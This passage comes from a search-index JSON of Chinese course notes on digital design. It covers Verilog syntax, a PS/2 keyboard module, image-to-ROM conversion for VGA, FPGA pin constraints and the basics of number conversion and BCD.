\u5173\u952e\u5b57\u6765\u8868\u793a\u8fde\u7eed\u8d4b\u503c\uff0c\u8fd9\u91cc\u5927\u5bb6\u9700\u8981\u533a\u5206\u4e00\u4ef6\u4e8b\uff0c\u8fde\u7eed\u8d4b\u503c\u53ea\u80fd\u8d4b\u503c\u7ed9 wire \u578b\u53d8\u91cf\uff0c\u4f46\u662f assign \u5173\u952e\u5b57\u53ef\u4ee5\u8d4b\u503c\u7ed9 reg \u578b\u53d8\u91cf\uff0c\u8fd9\u662f\u8fc7\u7a0b\u8fde\u7eed\u8d4b\u503c\u3002\u5373 assign \u4e0d\u5b8c\u5168\u7b49\u540c\u4e8e\u8fde\u7eed\u8d4b\u503c\u3002</p> <pre><code>assign LHS_target = RHS_expression \uff1b\n</code></pre> <p>LHS_target \u53ea\u80fd\u662f wire \u578b\u53d8\u91cf\uff0c\u53ef\u4ee5\u662f\u6807\u91cf\u6216\u8005\u5411\u91cf\u3002 RHS_expression \u5219\u6ca1\u6709\u8981\u6c42\uff0c \u53ea\u8981 RHS_expression \u8868\u8fbe\u5f0f\u7684\u64cd\u4f5c\u6570\u6709\u4e8b\u4ef6\u53d1\u751f\uff08\u503c\u7684\u53d8\u5316\uff09\u65f6\uff0cRHS_expression \u5c31\u4f1a\u7acb\u523b\u91cd\u65b0\u8ba1\u7b97\uff0c\u540c\u65f6\u8d4b\u503c\u7ed9 LHS_target\u3002</p> <p>\u56e0\u4e3a\u6211\u4eec\u5199\u5b8c\u4ee3\u7801\u540e\uff0c\u7ebf\u8def\u5df2\u7ecf\u88ab\u710a\u6b7b\uff0c\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7\u7535\u8def\u672c\u8eab\u7684\u7535\u5e73\u63a7\u5236\u6216\u8005\u8bbe\u8ba1\u6765\u91cd\u65b0\u8fde\u63a5\u7535\u8def\uff0c\u56e0\u6b64\u5927\u5bb6\u5728\u5b9e\u9645\u5b9e\u9a8c\u4e2d\u9700\u8981\u6ce8\u610f wire \u53d8\u91cf\u4ec5\u80fd\u8fde\u7eed\u8d4b\u503c\u4e00\u6b21\u3002</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_19","title":"\u8fc7\u7a0b\u8d4b\u503c","text":"<p>\u4e0e\u8fde\u7eed\u8d4b\u503c\u76f8\u5bf9\u5e94\u7684\u5c31\u662f\u8fc7\u7a0b\u8d4b\u503c\uff0c\u8fc7\u7a0b\u6027\u8d4b\u503c\u662f\u5728 initial \u6216 always \u8bed\u53e5\u5757\u91cc\u7684\u8d4b\u503c\uff0c\u8d4b\u503c\u5bf9\u8c61\u662f\u5bc4\u5b58\u5668\u3001\u6574\u6570\u3001\u5b9e\u6570\u7b49\u7c7b\u578b\u3002 \u8fd9\u4e9b\u53d8\u91cf\u5728\u88ab\u8d4b\u503c\u540e\uff0c\u5176\u503c\u5c06\u4fdd\u6301\u4e0d\u53d8\uff0c\u76f4\u5230\u91cd\u65b0\u88ab\u8d4b\u4e88\u65b0\u503c\u3002</p> <p>\u4e0e\u8fde\u7eed\u6027\u8d4b\u503c\u4e0d\u540c\uff0c\u8fc7\u7a0b\u6027\u8d4b\u503c\u5b58\u5728\u4fdd\u6301\u7684\u7279\u6027\uff0c\u8fd9\u5176\u5b9e\u4e5f\u662f\u7535\u8def\u4e2d\u5bc4\u5b58\u5668\u7684\u7279\u6027\u3002 \u4e0e\u8fde\u7eed\u6027\u8d4b\u503c\u4e0d\u540c\uff0c\u8fc7\u7a0b\u8d4b\u503c\u5206\u4e3a\u963b\u585e\u8d4b\u503c\u548c\u975e\u963b\u585e\u8d4b\u503c\u3002</p> <ul> <li>\u963b\u585e\u8d4b\u503c\u5c5e\u4e8e\u987a\u5e8f\u6267\u884c\uff0c\u5373\u4e0b\u4e00\u6761\u8bed\u53e5\u6267\u884c\u524d\uff0c\u5f53\u524d\u8bed\u53e5\u4e00\u5b9a\u4f1a\u6267\u884c\u5b8c\u6bd5\u3002\u963b\u585e\u8d4b\u503c\u8bed\u53e5\u4f7f\u7528\u7b49\u53f7 = \u4f5c\u4e3a\u8d4b\u503c\u7b26\u3002</li> <li>\u975e\u963b\u585e\u8d4b\u503c\u5c5e\u4e8e\u5e76\u884c\u6267\u884c\u8bed\u53e5\uff0c\u5373\u4e0b\u4e00\u6761\u8bed\u53e5\u7684\u6267\u884c\u548c\u5f53\u524d\u8bed\u53e5\u7684\u6267\u884c\u662f\u540c\u65f6\u8fdb\u884c\u7684\uff0c\u5b83\u4e0d\u4f1a\u963b\u585e\u4f4d\u4e8e\u540c\u4e00\u4e2a\u8bed\u53e5\u5757\u4e2d\u540e\u9762\u8bed\u53e5\u7684\u6267\u884c\u3002 \u975e\u963b\u585e\u8d4b\u503c\u8bed\u53e5\u4f7f\u7528\u5c0f\u4e8e\u7b49\u4e8e\u53f7 &lt;= \u4f5c\u4e3a\u8d4b\u503c\u7b26\u3002</li> </ul> <p>\u6211\u4eec\u5728\u5b9e\u9645\u7684\u64cd\u4f5c\u4e2d\uff0c \u4e0d\u8981\u6df7\u7528\u963b\u585e\u8d4b\u503c\u548c\u975e\u963b\u585e\u8d4b\u503c \uff0c\u56e0\u4e3a\u8fd9\u6837\u4f1a\u5bfc\u81f4\u65f6\u5e8f\u4e0d\u6613\u63a7\u5236\uff0c\u9020\u6210\u610f\u5411\u4e0d\u5230\u7684\u540e\u679c\u3002</p> <p>\u5728\u8bbe\u8ba1\u7535\u8def\u65f6\uff0calways \u65f6\u5e8f\u903b\u8f91\u5757\u4e2d\u591a\u7528\u975e\u963b\u585e\u8d4b\u503c\uff0calways \u7ec4\u5408\u903b\u8f91\u5757\u4e2d\u591a\u7528\u963b\u585e\u8d4b\u503c\uff1b\u5728\u4eff\u771f\u7535\u8def\u65f6\uff0cinitial \u5757\u4e2d\u4e00\u822c\u591a\u7528\u963b\u585e\u8d4b\u503c\u3002</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>always @(posedge clk) begin \u00a0 \u00a0 \n    a &lt; = b ; \nend \u00a0 \nalways @(posedge clk) begin \u00a0 \u00a0 \n    b &lt; = a; \nend\n</code></pre> <p>\u6b64\u65f6a&lt;=b \u4e0e b&lt;=a \u53ef\u4ee5\u76f8\u4e92\u4e0d\u5e72\u6270\u7684\u6267\u884c\uff0c\u8fbe\u5230\u4ea4\u6362\u5bc4\u5b58\u5668\u503c\u7684\u76ee\u7684\u3002</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_20","title":"\u7ed3\u6784\u5efa\u6a21","text":""},{"location":"Courses/DD/Verilog/VerilogBasic/#_21","title":"\u6a21\u5757\u5b9a\u4e49\u7ed3\u6784","text":"<pre><code>module module_name(port_list);\n    Declarations_and_Statements\nendmodule\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_22","title":"\u5b9e\u4f8b\u5316\u8bed\u53e5","text":"<pre><code>module and(C,A,B);\n    input A,B;\n    output C;\n    ...\n    and A1(T3,A,B);             //\u91c7\u7528\u4f4d\u7f6e\u5173\u8054\n    and A2(.C(T3),.A(A),.B(B)); //\u91c7\u7528\u540d\u5b57\u5173\u8054\n    ...\n</code></pre> <ul> <li>\u5728\u5b9e\u4f8b\u5316\u4e2d\uff0c\u6709\u4e9b\u7ba1\u811a\u53ef\u80fd\u6ca1\u7528\u5230\uff0c\u53ef\u5728\u6620\u5c04\u4e2d\u91c7\u7528\u7a7a\u767d\u5904\u7406\uff0c\u5982\uff1a</li> </ul> <pre><code>DFF d1(\n    .Q(QS),\n    .Qbar(),    //\u8be5\u7ba1\u811a\u60ac\u7a7a\n    .Data(D),\n    .Preset(), //\u8be5\u7ba1\u811a\u60ac\u7a7a\n    .Clock(CK)\n);\n</code></pre> <p>\u5bf9\u8f93\u5165\u7ba1\u811a\u60ac\u7a7a\u7684\uff0c\u5219\u8be5\u7ba1\u811a\u8f93\u5165\u4e3a\u9ad8\u963b Z\uff0c\u8f93\u51fa\u7ba1\u811a\u88ab\u60ac\u7a7a\u7684\uff0c\u8be5\u8f93\u51fa\u7ba1\u811a\u5e9f\u5f03\u4e0d\u7528  </p> <ul> <li>\u5f53\u7aef\u53e3\u957f\u5ea6\u548c\u5c40\u90e8\u7aef\u53e3\u8868\u8fbe\u5f0f\u957f\u5ea6\u4e0d\u540c\u65f6\uff0c\u7aef\u53e3\u901a\u8fc7\u65e0\u7b26\u53f7\u6570\u7684\u53f3\u5bf9\u9f50\u6216\u622a\u65ad\u65b9\u5f0f\u8fdb\u884c\u5339\u914d\u3002</li> </ul> <pre><code>module Child(Pba,Ppy);\n    input [5:0] Pba;\n    output [2:0] Ppy;\n    ...\nendmodule\n\nmodule Top;\n    wire [1:2] Bdl;\n    wire [2:6] Mpr;\n    Child C1(Bdl,Mpr);\nendmodule\n</code></pre> <p>\u5728\u8be5\u4f8b\u4e2d\uff0cBdl[2]\u8fde\u63a5\u5230Pba[0]\uff0c Bdl[1] \u8fde\u63a5\u5230Pba[1]\uff0c\u4f59\u4e0b\u7684\u8f93\u5165\u7aef\u53e3Pba[5]\u3001 Pba[4]\u548cPba[3]\u60ac\u7a7a\uff0c\u56e0\u6b64\u4e3a\u9ad8\u963b\u6001z \u3002\u4e0e\u4e4b\u76f8\u4f3c\uff0c Mpr[6]\u8fde\u63a5\u5230Ppy[0]\uff0c Mpr[5]\u8fde\u63a5\u5230Ppy[1]\uff0c Mpr[4] \u8fde\u63a5\u5230Ppy[2]\uff0c\u5176\u4f59\u622a\u65ad\u3002</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_23","title":"\u8fc7\u7a0b\u7ed3\u6784","text":""},{"location":"Courses/DD/Verilog/VerilogBasic/#initial","title":"initial\u8bed\u53e5","text":"<p>initial \u8bed\u53e5\u4ece 0 \u65f6\u523b\u5f00\u59cb\u6267\u884c\uff0c\u53ea\u6267\u884c\u4e00\u6b21\uff0c\u591a\u4e2a initial \u5757\u4e4b\u95f4\u662f\u76f8\u4e92\u72ec\u7acb\u7684\u3002</p> <p>\u5982\u679c initial \u5757\u5185\u5305\u542b\u591a\u4e2a\u8bed\u53e5\uff0c\u9700\u8981\u4f7f\u7528\u5173\u952e\u5b57 begin \u548c end \u7ec4\u6210\u4e00\u4e2a\u5757\u8bed\u53e5\u3002</p> <p>initial\u8bed\u53e5\u5927\u591a\u7528\u4e8e\u4eff\u771f\u65f6\u6a21\u62df\u8f93\u5165\u7535\u5e73\uff0c\u6216\u8005\u7528\u4e8e\u521d\u59cb\u5316\u5668\u4ef6\u7684\u5bc4\u5b58\u5668\u3002</p> <pre><code>`timescale 1ns/1ns \nmodule test ; \u00a0 \u00a0 \n    reg \u00a0ai, bi ; \u00a0 \u00a0 \u00a0 \n    initial begin \u00a0 \u00a0 \u00a0 \u00a0 \n        bi = 1 ; \n        # 10; \n        ai = 1 ; \u00a0 \u00a0 \n    end \u00a0 \nendmodule\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#always","title":"always\u8bed\u53e5","text":"<p>\u4e0e initial \u8bed\u53e5\u76f8\u53cd\uff0calways \u8bed\u53e5\u662f\u91cd\u590d\u6267\u884c\u7684\u3002always \u8bed\u53e5\u5757\u4ece 0 \u65f6\u523b\u5f00\u59cb\u6267\u884c\u5176\u4e2d\u7684\u884c\u4e3a\u8bed\u53e5\uff1b\u5f53\u6267\u884c\u5b8c\u6700\u540e\u4e00\u6761\u8bed\u53e5\u540e\uff0c\u4fbf\u518d\u6b21\u6267\u884c\u8bed\u53e5\u5757\u4e2d\u7684\u7b2c\u4e00\u6761\u8bed\u53e5\uff0c\u5982\u6b64\u5faa\u73af\u53cd\u590d\u3002</p> <p>always \u8bed\u53e5\u642d\u914d\u4e8b\u4ef6\u63a7\u5236\u7b26\u53f7@\u53ef\u4ee5\u8fbe\u5230\u7279\u5b9a\u6761\u4ef6\u4e0b\u6267\u884c\u7279\u5b9a\u4e8b\u4ef6\u7684\u4f5c\u7528\u3002</p> <pre><code>// \u4fe1\u53f7clk\u548crst\u53ea\u8981\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u6267\u884cq&lt; =d\uff0c\u53cc\u8fb9\u6cbfD\u89e6\u53d1\u5668\u6a21\u578b \nalways @(clk, rst) begin \n    q &lt; = d ; \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \nend\u00a0 \u00a0 \n// \u5728\u4fe1\u53f7clk\u4e0a\u5347\u6cbf\u65f6\u523b\uff0c\u6267\u884cq&lt; =d\uff0c\u6b63\u8fb9\u6cbfD\u89e6\u53d1\u5668\u6a21\u578b \nalways @(posedge clk) begin \n    q &lt; = d ; \u00a0 \nend \n// \u5728\u4fe1\u53f7clk\u4e0b\u964d\u6cbf\u65f6\u523b\uff0c\u6267\u884cq&lt;=d\uff0c\u8d1f\u8fb9\u6cbfD\u89e6\u53d1\u5668\u6a21\u578b \nalways @(negedge clk) begin \n    q &lt; = d ; \nend \n// \u4efb\u4f55\u4fe1\u53f7\u53ea\u8981\u53d1\u751f\u53d8\u5316\uff0c\u5c31\u6267\u884cq&lt; =d\uff0c \nalways @(*) begin \n    q &lt; = d ; \nend\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_24","title":"\u4ee3\u7801\u7684\u8bed\u53e5","text":"<p>\u6761\u4ef6\u8bed\u53e5\u3001\u591a\u8def\u5206\u652f\u8bed\u53e5\u548c\u5faa\u73af\u8bed\u53e5\uff0c\u90fd\u9700\u8981\u5728\u8fc7\u7a0b\u7ed3\u6784\u4e2d\uff0c\u5373\u90fd\u9700\u8981\u5728 initial \u8bed\u53e5\u6216\u8005 always \u8bed\u53e5\u4e2d\u3002</p>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_25","title":"\u6761\u4ef6\u8bed\u53e5","text":"<p>\u5728Verilog HDL\u4e2d\uff0celse \u4e0e\u6700\u8fd1\u7684\u6ca1\u6709else \u7684if \u76f8\u5173\u8054 </p> <p>\u5bf9if \u8bed\u53e5\uff0c\u9664\u975e\u5728\u65f6\u5e8f\u903b\u8f91\u4e2d\uff0c if \u8bed\u53e5\u9700\u8981\u6709else \u8bed\u53e5\u3002\u82e5\u6ca1\u6709\u7f3a\u7701\u8bed\u53e5\uff0c\u8bbe\u8ba1\u5c06\u4ea7\u751f\u4e00\u4e2a\u9501\u5b58\u5668\uff0c\u9501\u5b58\u5668\u5728ASIC\u8bbe\u8ba1\u4e2d\u6709\u8bf8\u591a\u7684\u5f0a\u7aef\uff08\u53ef\u770b\u540c\u6b65\u8bbe\u8ba1\u6280\u672f\u6240\u4ecb\u7ecd\uff09\u3002\u5982\u4e0b\u4e00\u4f8b\uff1a</p> <pre><code>if \uff08T\uff09\n    Q = D\uff1b\n</code></pre> <p>\u6ca1\u6709else \u8bed\u53e5\uff0c\u5f53T\u4e3a1\uff08\u771f\uff09\u65f6\uff0c D \u88ab\u8d4b\u503c\u7ed9Q\uff0c\u5f53T\u4e3a0\uff08\u5047\uff09\u65f6\uff0c\u56e0\u4e3a\u6ca1\u6709else \u8bed\u53e5\uff0c\u7535\u8def\u4fdd\u6301 Q \u4ee5\u524d\u7684\u503c\uff0c\u8fd9\u5c31\u5f62\u6210\u4e00\u4e2a\u9501\u5b58\u5668\u3002 </p> <pre><code>case(HES)\n    4`b0001,4`b0010,4`b0011: begin \n        LED = 7`b1111001;\n    end\n    4`b0100,4`b0101,4`b0110: LED = 7`b0000110;\n    ...\n    default: ; //case\u7684\u7f3a\u7701\u503c\u5fc5\u987b\u5199\uff0c\u9632\u6b62\u4ea7\u751f\u9501\u5b58\u5668\n    endcase\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u5e0c\u671b\u6761\u4ef6\u8bed\u53e5\u5199\u5728\u8fc7\u7a0b\u7ed3\u6784\u5916\u9762\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528\u7ebf\u7f51\u8fde\u7eed\u8d4b\u503c\uff1a</p> <pre><code>assign a = (b &amp; rst) ? 1'b0 : 1'b1;\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogBasic/#_26","title":"\u5faa\u73af\u8bed\u53e5","text":"<pre><code>for(initial_assignment; condition ; step_assignment) begin \n    \u2026 \nend \nmodule test; \n... \n    initial begin \u00a0 \u00a0 \n        counter2 = 'b0 ; \u00a0 \u00a0 \n        for (i=0; i&lt;=10; i=i+1) begin \u00a0 \u00a0 \u00a0 \u00a0 \n            #10 ; \u00a0 \u00a0 \u00a0 \u00a0 \n            counter2 = counter2 + 1'b1 ; \u00a0 \u00a0 \n        end \n    end \nendmodule\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogSupplement/","title":"Verilog\u8865\u5145","text":"<p> \u7ea6 279 \u4e2a\u5b57  179 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p>"},{"location":"Courses/DD/Verilog/VerilogSupplement/#vga","title":"VGA \u663e\u793a\u56fe\u7247","text":"<ul> <li>Step 1: \u5c06\u9700\u8981\u8f6c\u6362\u7684\u56fe\u7247\u7528Python\u7a0b\u5e8f\u8f6c\u6362\u6210 <code>.coe</code> \u683c\u5f0f</li> </ul> <pre><code>from PIL import Image\nimport numpy as np\nimport matplotlib.pyplot as plt\n\n\nimg = Image.open(\"Start.png\")\npix = img.load()\nwidth = img.size[0]\nheight = img.size[1]\nf = open(\"Start.coe\", \"w\")\nf.write(\"memory_initialization_radix = 2;\\n\")\nf.write(\"memory_initialization_vector = \\n\")\n\nfor y in range(height):\n    for x in range(width):\n        r, g, b = pix[x, y]\n        r_ok = r&gt;&gt;4\n        g_ok = g&gt;&gt;4\n        b_ok = b&gt;&gt;4\n        f.write(\"%s%s%s,\\n\"%('{:04b}'.format(r_ok), '{:04b}'.format(g_ok), '{:04b}'.format(b_ok),))\n</code></pre> <p>\u7531\u4e8e\u6211\u4eec\u6240\u7528\u7684VGA\u6a21\u5757\uff0cRGB\u7684\u987a\u5e8f\u5b9e\u9645\u4e0a\u662f <code>BGR</code> \uff0c\u56e0\u6b64\u4e0a\u9762\u7a0b\u5e8f\u53ef\u4ee5\u5c06 <code>r_ok</code> \u548c <code>b_ok</code> \u4ea4\u6362\u3002\u4f46\u662f\u5728\u8d2a\u5403\u86c7\u5927\u7a0b\u5e8f\u4e2d\u6211\u5e76\u6ca1\u6709\u8fd9\u4e48\u505a\uff0c\u800c\u662f\u624b\u52a8\u5c06\u5176\u53cd\u8f6c\uff0c\u5982: <code>VGA_RGB = {StartPage_RGB[3:0],StartPage_RGB[7:4],StartPage_RGB[11:8]};</code></p> <p>\u6253\u5f00\u5f97\u5230\u7684 coe \u6587\u4ef6\uff0c\u53ef\u4ee5\u770b\u5230\u7c7b\u4f3c\u5982\u4e0b\u5185\u5bb9:</p> <p></p> <ul> <li>Step 2: \u521b\u5efa ROM \u5e76\u8f7d\u5165\u6570\u636e<ul> <li>\u5728IP Catalog\u4e2d\u641c\u7d22ROM\uff0c\u9009\u62e9 Block Memory Generator<ul> <li></li> </ul> </li> <li>Basic \u4e2d\u9009 Single Port Rom<ul> <li></li> </ul> </li> <li>\u6309\u7167\u4e0b\u56fe\u586b\u5199(\u5176\u4e2dDepth\u5927\u4e8e\u67d0\u4e2a\u6570\u5373\u53ef)\uff0c\u53d6\u6d88\u52fe\u9009 Primitives Output Register<ul> <li></li> </ul> </li> <li>Load Init File\uff0c\u9009\u62e9\u4f60\u7684coe\u6587\u4ef6<ul> <li></li> </ul> </li> <li>\u8c03\u7528\u65b9\u6cd5\u5982\u4e0b\uff1a <code>ROM_StartPage StartPage_unit(.clka(clk),.addra(row*640+col),.douta(StartPage_RGB),.ena(1));</code></li> </ul> </li> </ul>"},{"location":"Courses/DD/Verilog/VerilogSupplement/#ps2","title":"PS/2 \u952e\u76d8","text":""},{"location":"Courses/DD/Verilog/VerilogSupplement/#_1","title":"\u6a21\u5757\u53c2\u8003\u4ee3\u7801","text":"<pre><code>module PS2(\n    input clk, rst,\n    input ps2_clk, ps2_data,\n    output reg up, left, right, down ,enter\n    );\n\nreg ps2_clk_falg0, ps2_clk_falg1, ps2_clk_falg2;\nwire negedge_ps2_clk = !ps2_clk_falg1 &amp; ps2_clk_falg2;\nreg negedge_ps2_clk_shift;\nreg [9:0] data;\nreg data_break, data_done, data_expand;\nreg[7:0]temp_data;\nreg[3:0]num;\n\nalways@(posedge clk or posedge rst)begin\n    if(rst)begin\n        ps2_clk_falg0&lt;=1'b0;\n        ps2_clk_falg1&lt;=1'b0;\n        ps2_clk_falg2&lt;=1'b0;\n    end\n    else begin\n        ps2_clk_falg0&lt;=ps2_clk;\n        ps2_clk_falg1&lt;=ps2_clk_falg0;\n        ps2_clk_falg2&lt;=ps2_clk_falg1;\n    end\nend\n\nalways@(posedge clk or posedge rst)begin\n    if(rst)\n        num&lt;=4'd0;\n    else if (num==4'd11)\n        num&lt;=4'd0;\n    else if (negedge_ps2_clk)\n        num&lt;=num+1'b1;\nend\n\nalways@(posedge clk)begin\n    negedge_ps2_clk_shift&lt;=negedge_ps2_clk;\nend\n\n\nalways@(posedge clk or posedge rst)begin\n    if(rst)\n        temp_data&lt;=8'd0;\n    else if (negedge_ps2_clk_shift)begin\n        case(num)\n            4'd2 : temp_data[0]&lt;=ps2_data;\n            4'd3 : temp_data[1]&lt;=ps2_data;\n            4'd4 : temp_data[2]&lt;=ps2_data;\n            4'd5 : temp_data[3]&lt;=ps2_data;\n            4'd6 : temp_data[4]&lt;=ps2_data;\n            4'd7 : temp_data[5]&lt;=ps2_data;\n            4'd8 : temp_data[6]&lt;=ps2_data;\n            4'd9 : temp_data[7]&lt;=ps2_data;\n            default: temp_data&lt;=temp_data;\n        endcase\n    end\n    else temp_data&lt;=temp_data;\nend\n\nalways@(posedge clk or posedge rst)begin\n    if(rst)begin\n        data_break&lt;=1'b0;\n        data&lt;=10'd0;\n        data_done&lt;=1'b0;\n        data_expand&lt;=1'b0;\n    end\n    else if(num==4'd11)begin\n        if(temp_data==8'hE0)begin\n            data_expand&lt;=1'b1;\n        end\n        else if(temp_data==8'hF0)begin\n            data_break&lt;=1'b1;\n        end\n        else begin\n            data&lt;={data_expand,data_break,temp_data};\n            data_done&lt;=1'b1;\n            data_expand&lt;=1'b0;\n            data_break&lt;=1'b0;\n        end\n    end\n    else begin\n        data&lt;=data;\n        data_done&lt;=1'b0;\n        data_expand&lt;=data_expand;\n        data_break&lt;=data_break;\n    end\nend\n\nalways @(posedge clk) begin\n    case (data)\n        10'h05A:enter &lt;= 1;\n        10'h15A:enter &lt;= 0;\n        10'h272:down &lt;= 1;\n        10'h372:down &lt;= 0;\n        10'h275:up &lt;= 1;\n        10'h375:up &lt;= 0;\n        10'h26B:left &lt;= 1;\n        10'h36B:left &lt;= 0;\n        10'h274:right &lt;= 1;\n        10'h374:right &lt;= 0;\n    endcase\nend\n\nendmodule\n</code></pre> <p>\u8c03\u7528\u5982\u4e0b:</p> <pre><code>PS2 ps2_unit(\n    .clk(clk), .rst(0),\n    .ps2_clk(PS2_clk), .ps2_data(PS2_data),\n    .up(up), .left(left), .right(right), \n    .down(down),.enter(NewReset));\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogSupplement/#hold","title":"Hold \u6a21\u5757","text":"<p>\u7531\u4e8e\u952e\u76d8\u6309\u4e0b\u53bb\u4ea7\u751f\u7684\u4fe1\u53f7\u662f\u77ac\u65f6\u6027\u7684\uff0c\u6709\u65f6\u5019\u6211\u4eec\u9700\u8981\u5bf9\u8fd9\u4e2a\u4fe1\u53f7\u8fdb\u884c\u4fdd\u6301\uff0c\u4f7f\u5f97\u5176\u5728\u4e0b\u4e00\u6b21\u6309\u952e\u524d\u90fd\u4fdd\u6301\u4e0d\u53d8</p> <pre><code>module key_hold(\n    input clk,\n    input up,\n    input left,\n    input right,\n    input down,\n    input reset,\n    output reg up_hold,\n    output reg left_hold,\n    output reg right_hold,\n    output reg down_hold\n);\n\nreg [3:0] last_key = 4'b0000; // \u4f7f\u75284\u4f4d\u5bc4\u5b58\u5668\u5b58\u50a8\u4e0a\u4e00\u4e2a\u6309\u952e\u7684\u72b6\u6001\n\nalways @(posedge clk) begin\n    // \u68c0\u67e5\u662f\u5426\u6709\u6309\u952e\u88ab\u6309\u4e0b\n    if (up == 1) last_key &lt;= 4'b0001;\n    else if (left == 1) last_key &lt;= 4'b0010;\n    else if (right == 1) last_key &lt;= 4'b0100;\n    else if (down == 1) last_key &lt;= 4'b1000;\n\n    if(reset) last_key &lt;= 4'b0000;\n\n    // \u6839\u636elast_key\u7684\u503c\u8bbe\u7f6e\u8f93\u51fa\n    case (last_key)\n        4'b0001: begin\n            up_hold &lt;= 1; left_hold &lt;= 0; right_hold &lt;= 0; down_hold &lt;= 0;\n        end\n        4'b0010: begin\n            up_hold &lt;= 0; left_hold &lt;= 1; right_hold &lt;= 0; down_hold &lt;= 0;\n        end\n        4'b0100: begin\n            up_hold &lt;= 0; left_hold &lt;= 0; right_hold &lt;= 1; down_hold &lt;= 0;\n        end\n        4'b1000: begin\n            up_hold &lt;= 0; left_hold &lt;= 0; right_hold &lt;= 0; down_hold &lt;= 1;\n        end\n        default: begin\n            up_hold &lt;= 0; left_hold &lt;= 0; right_hold &lt;= 0; down_hold &lt;= 0;\n        end\n    endcase\nend\n\nendmodule\n</code></pre>"},{"location":"Courses/DD/Verilog/VerilogSupplement/#_2","title":"\u7ea6\u675f\u6587\u4ef6","text":"<pre><code>set_property PACKAGE_PIN N18 [get_ports PS2_clk]\nset_property IOSTANDARD LVCMOS33 [get_ports PS2_clk]\nset_property PACKAGE_PIN M19 [get_ports PS2_data]\nset_property IOSTANDARD LVCMOS33 [get_ports PS2_data]\n</code></pre>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/","title":"CH 1 &2 P1.Digital System & Boolean Equation","text":""},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#chapter-1-2-part-1-digital-system-boolean-equation","title":"Chapter 1 &amp; 2 Part 1 Digital System &amp; Boolean Equation","text":"<p> \u7ea6 866 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Danger</p> <p>Chapter 1 \u53ca Chapter 2 Part 1 \u5185\u5bb9\u8f83\u4e3a\u6742\u4e71\uff0c\u56e0\u6b64\u4ec5\u5c06\u8981\u70b9\u653e\u4e8e\u6b64\uff0c\u63a8\u8350\u81ea\u884c\u89c2\u770b\u8bfe\u4ef6</p> <ul> <li>\u6a21\u62df\u4fe1\u53f7(analog signals)\uff1a\u5728\u503c\u548c\u65f6\u95f4\u4e0a\u90fd\u662f \u8fde\u7eed(continuous)\u00a0\u7684\u4fe1\u53f7</li> <li>\u6570\u5b57\u4fe1\u53f7(digital signals)\uff1a\u5728\u503c\u548c\u65f6\u95f4\u4e0a\u90fd\u662f \u79bb\u6563(discrete)\u00a0\u7684\u4fe1\u53f7</li> </ul>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#_1","title":"\u8fdb\u5236\u7684\u8f6c\u6362","text":"<ul> <li>\u5341\u8fdb\u5236\u8f6c\u4e8c\u8fdb\u5236<ul> <li>\u6574\u6570\u90e8\u5206\u6bcf\u8f6e\u9664\u4ee52\uff0c\u4f59\u591a\u5c11\u5c31\u4ece\u53f3\u5f80\u5de6\u52a0\u591a\u5c11</li> <li>\u5c0f\u6570\u90e8\u5206\u6bcf\u8f6e\u4e58\u4e0a2\uff0c\u5982\u679c\u5927\u4e8e1\uff0c\u5c31\u4ece\u5de6\u5f80\u53f3\u52a0\u4e0a1\uff1b\u4e0d\u5927\u4e8e1\uff0c\u5219\u52a00</li> </ul> </li> <li>\u5341\u8fdb\u5236\u8f6c\u516b\u8fdb\u5236\u3001\u5341\u516d\u8fdb\u5236<ul> <li>\u5148\u8f6c\u6210\u4e8c\u8fdb\u5236\uff0c\u518d\u63a5\u7740\u8f6c\u6362\u5373\u53ef<ul> <li>\u4e8c\u8fdb\u5236\u8f6c\u516b\u8fdb\u5236\uff0c\u6bcf\u4e09\u4f4d\u5bf9\u5e94\u4e00\u4e2a\u6570\u5b57\uff0c\u4e0d\u591f\u8865\u96f6\uff0c\u5c0f\u6570\u90e8\u5206\u540c\u7406</li> <li>\u4e8c\u8fdb\u5236\u8f6c\u5341\u516d\u8fdb\u5236\uff0c\u6bcf\u56db\u4f4d\u5bf9\u5e94\u4e00\u4e2a\u6570\u5b57\uff0c\u4e0d\u591f\u8865\u96f6\uff0c\u5c0f\u6570\u90e8\u5206\u540c\u7406</li> </ul> </li> </ul> </li> </ul>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#_2","title":"\u5e38\u89c1\u7684\u56db\u79cd\u7f16\u7801\u65b9\u5f0f","text":""},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#bcd","title":"BCD \u7801","text":"<p>8,4,2,1\u53c8\u79f0 BCD\u7801 (Binary Code Decimal)</p> <p>\u6ce8\u610f\u533a\u522b\u7f16\u7801\u548c\u4e8c\u8fdb\u5236 (\u91cd\u8981)</p> <p></p>(185)<sub>10</sub> = (0001 1000 0101)<sub>BCD</sub> = (10111001)<sub>2</sub> <p></p>\u8bf7\u6ce8\u610f\u7f16\u7801\u4e0d\u4ec5\u662f\u5bf9\u6bcf\u4f4d\u6570\u5b57\u5355\u72ec\u7f16\u7801\uff0c\u8fd8\u8981\u8865\u6ee1\u56db\u4f4d 